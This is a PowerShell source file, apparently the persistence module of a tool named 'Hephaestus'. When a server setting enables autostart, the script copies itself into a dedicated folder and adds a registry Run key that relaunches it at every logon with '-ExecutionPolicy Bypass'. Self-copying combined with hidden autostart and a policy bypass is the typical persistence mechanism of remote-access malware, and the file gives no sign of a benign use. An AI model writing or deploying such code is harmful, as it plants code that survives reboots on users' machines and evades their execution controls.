. ./utils.ps1
. ./consts.ps1




function Is-HephaestusScript {
    $currentScriptPath = $MyInvocation.MyCommand.Path
    $HephaestusPath = Get-HephaestusPath

    return $currentScriptPath -eq $HephaestusPath
}

function Add-HephaestusToStartup {
    $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $keyName = "Hephaestus"
    
    $HephaestusPath = Get-HephaestusPath
    $powershellCommand = "powershell.exe -ExecutionPolicy Bypass -File `"$HephaestusPath`" -ArgumentList '-autostart'"

    try {
        if (Test-Path -Path $registryPath) {
            $currentValue = Get-ItemProperty -Path $registryPath -Name $keyName -ErrorAction SilentlyContinue

            if ($currentValue.$keyName -eq $powershellCommand) {
                writedbg "The 'Hephaestus' key is already set with the correct value." -ForegroundColor Green
            } else {
                Set-ItemProperty -Path $registryPath -Name $keyName -Value $powershellCommand
                writedbg "'Hephaestus' key updated with the correct value." -ForegroundColor Green
            }
        } else {
            New-Item -Path $registryPath -Force | Out-Null
            New-ItemProperty -Path $registryPath -Name $keyName -Value $powershellCommand -PropertyType String -Force | Out-Null
            writedbg "'Hephaestus' key added to startup." -ForegroundColor Green
        }
    } catch {
        writedbg "Error while adding/updating the 'Hephaestus' key: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function Copy-ToHephaestusPath {
    $currentScriptPath = $PSCommandPath
    if (-not $currentScriptPath) {
        writedbg "This is not being run from a script file." -ForegroundColor Yellow
        return
    }

    $HephaestusPath = Get-HephaestusPath
    $HephaestusFolder = Get-HephaestusFolder

    try {
        if (-not (Test-Path $HephaestusFolder)) {
            New-Item -Path $HephaestusFolder -ItemType Directory | Out-Null
        }

        Copy-Item -Path $currentScriptPath -Destination $HephaestusPath -Force
        writedbg "Script successfully copied to: $HephaestusPath"
    } catch {
        writedbg "Error copying script to Hephaestus path: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function DoAuto {
    try 
    {
        if ($server.autoStart)
        {
            $isAuto = Is-HephaestusScript
            writedbg "isAuto: $isAuto"
            if (-not $isAuto)
            {
                Copy-ToHephaestusPath
            }
            Add-HephaestusToStartup
        }
    } catch {
        writedbg "Error DoAuto"
    }
}